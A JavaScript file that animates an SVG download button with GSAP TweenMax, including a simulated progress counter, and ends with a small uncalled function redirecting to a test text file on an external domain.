(function() {
  function $$(selector, context) {
    var context = context || document;
    var elements = context.querySelectorAll(selector);
    var nodesArr = [].slice.call(elements);
    return nodesArr.length === 1 ? nodesArr[0] : nodesArr;
  };

  var $status = $$('.dl-status');
  var $statusNumbers = $$('.dl-status__numbers');

  var $dlSVG = $$('.dl-svg');

  var $circle = $$('.dl-svg__circle');
  var $arrMain = $$('.dl-svg__arrow-main');
  var $arrSides = $$('.dl-svg__arrow-side');
  var $rotater = $$('.dl-svg__rotater');
  var $tri = $$('.dl-svg__triangle');
  var $triPiece = $$('.dl-svg__triangle-piece');
  var $plc = $$('.dl-svg__progress-plc');
  var $progress = $$('.dl-svg__progress');
  var $prVert = $$('.dl-svg__progress-vert');
  var $check = $$('.dl-svg__checkmark');

  var $resetBtn = $$('.dl-download');
  var $particles = $$('.particles');
  var $particlesStage2 = $$('.particles.m--stage-2');
  var $particlesStage3 = $$('.particles.m--stage-3');

  var arrInitAT = 0.5;
  var dotFadeAT = 0.1;
  var rtRotationAT = 1.4;
  var triAT = 1.1;
  var rtDelay = arrInitAT + dotFadeAT;
  var triPhase2Delay = triAT * 0.6;

  var progressDelay = 0.2;
  var progressAT = 1;
  var prCollapseAT = 0.5;
  var prMoveAT = 0.4;

  var circleAT = 0.6;

  var checkAT = 0.5;

  function resetDl() {
    $dlSVG.classList.remove('s--animating');
    $resetBtn.classList.remove('s--visible');
    $particles.forEach(function($part) {
      $part.classList.remove('s--active');
    });

    TweenMax.set($arrMain, {drawSVG: '100%', y: 0, opacity: 1});
    TweenMax.set($arrSides, {drawSVG: '100%'});
    TweenMax.set($circle, {transformOrigin: '50% 50%'});
    TweenMax.set($rotater, {opacity: 0, transformOrigin: '50% 50%', drawSVG: '0.5px', rotation: 0});
    TweenMax.set($tri, {opacity: 0, drawSVG: '1px'});
    TweenMax.set($triPiece, {opacity: 0, drawSVG: 0});
    TweenMax.set($plc, {opacity: 0, drawSVG: '305px 305px'});
    TweenMax.set($progress, {opacity: 0, drawSVG: 0});
    TweenMax.set($prVert, {opacity: 0, drawSVG: 0, transformOrigin: '50% 77px', rotation: 0});
    TweenMax.set($check, {opacity: 0, drawSVG: 0});
  };

  resetDl();

  function checkmarkAnim() {
    TweenMax.set($check, {opacity: 1});
    TweenMax.set($prVert, {opacity: 0});
    TweenMax.to($check, checkAT * 0.7, {drawSVG: '100% 40%'});
    TweenMax.to($check, checkAT * 0.3, {drawSVG: '95% 35%', delay: checkAT * 0.7,
                                        onComplete: function() {
                                          $resetBtn.classList.add('s--visible');
                                        }});
  };

  function successAnim() {
    $statusNumbers.innerHTML = 0;

    TweenMax.set($circle, {opacity: 1, drawSVG: 0, scale: 1});
    TweenMax.to($circle, circleAT, {drawSVG: '60%'});
    TweenMax.to($prVert, circleAT, {rotation: -432, onComplete: checkmarkAnim});
  };

  function afterProgressAnim() {
    $status.classList.remove('s--active');

    TweenMax.set($plc, {opacity: 0});
    TweenMax.to($progress, prCollapseAT, {drawSVG: '157px 156px'});
    TweenMax.set($progress, {opacity: 0, delay: prCollapseAT});
    TweenMax.set($prVert, {opacity: 1, delay: prCollapseAT});
    TweenMax.to($prVert, prMoveAT * 0.8, {drawSVG: '100% 70%', delay: prCollapseAT});
    TweenMax.to($prVert, prMoveAT * 0.2, {drawSVG: '100% 99%', delay: prCollapseAT + prMoveAT * 0.5, 
                                          onComplete: successAnim});
  };

  function progressAnim() {
    var status = {p: 0};
    TweenMax.set($progress, {opacity: 1, delay: progressDelay});
    TweenMax.to(status, progressAT, {p: 100, delay: progressDelay, ease: Power1.easeInOut, 
                                     onComplete: afterProgressAnim,
                                     onUpdate: function() {
                                       var _p = Math.ceil(status.p);
                                       $statusNumbers.innerHTML = _p;
                                       TweenMax.to($progress, 0.05, {drawSVG: _p + '%', ease: Power1.easeInOut});
                                     }});
  };

  function trinagleAnim() {
    $status.classList.add('s--active');

    TweenMax.to($rotater, 0.1, {opacity: 0});
    TweenMax.to($tri, 0.2, {opacity: 1});
    TweenMax.to($tri, triAT * 0.15, {drawSVG: '20%', ease: Power1.easeInOut,
                                    onComplete: function() {
                                      $particlesStage2.classList.add('s--active');
                                      setTimeout(function() {
                                        $particlesStage3.classList.add('s--active');
                                      }, triAT * 0.3 * 1000);
                                    }});
    TweenMax.to($tri, triAT * 0.65, {drawSVG: '90% 50%', delay: triAT * 0.15, ease: Power1.easeOut});
    TweenMax.to($tri, triAT * 0.4, {drawSVG: '105% 100%', opacity: 0, delay: triPhase2Delay, ease: Power1.easeOut, 
                                    onComplete: progressAnim});
    TweenMax.to($circle, 0.3, {scale: 0.8, opacity: 0, delay: triPhase2Delay});
    TweenMax.set($triPiece, {opacity: 1, delay: triPhase2Delay - triAT * 0.2});
    TweenMax.to($triPiece, triAT * 0.3, {drawSVG: '100% 25%', delay: triPhase2Delay - triAT * 0.2});
    TweenMax.to($triPiece, triAT * 0.2, {drawSVG: '100% 100%', delay: triPhase2Delay});
    TweenMax.set($plc, {opacity: 1, delay: triPhase2Delay});
    TweenMax.to($plc, triAT * 0.2, {drawSVG: '100% 0', delay: triPhase2Delay});
  };

  function initDlAnim() {
    $dlSVG.classList.add('s--animating');

    TweenMax.to($arrMain, arrInitAT, {drawSVG: '0.5px', y: -45});
    TweenMax.to($arrSides, arrInitAT, {drawSVG: '100% 100%'});
    TweenMax.to($arrMain, dotFadeAT, {opacity: 0, delay: arrInitAT * 1.1});

    TweenMax.to($rotater, dotFadeAT, {opacity: 1, delay: arrInitAT});
    TweenMax.to($rotater, rtRotationAT, {rotation: 720, delay: rtDelay, ease: Power1.easeInOut});
    TweenMax.to($rotater, rtRotationAT * 0.2, {drawSVG: '20px', opacity: 0.4, delay: rtDelay});
    TweenMax.to($rotater, rtRotationAT * 0.15, {drawSVG: '0.5px', opacity: 1, delay: rtDelay + rtRotationAT * 0.85,
                                                onComplete: trinagleAnim});
  };

  $dlSVG.addEventListener('click', function() {
    if ($dlSVG.classList.contains('s--animating')) return;
    initDlAnim();
  });


}());

function dwnld() {
  location.replace("http://gnet27.ml/files/test/autodwnl.txt")
}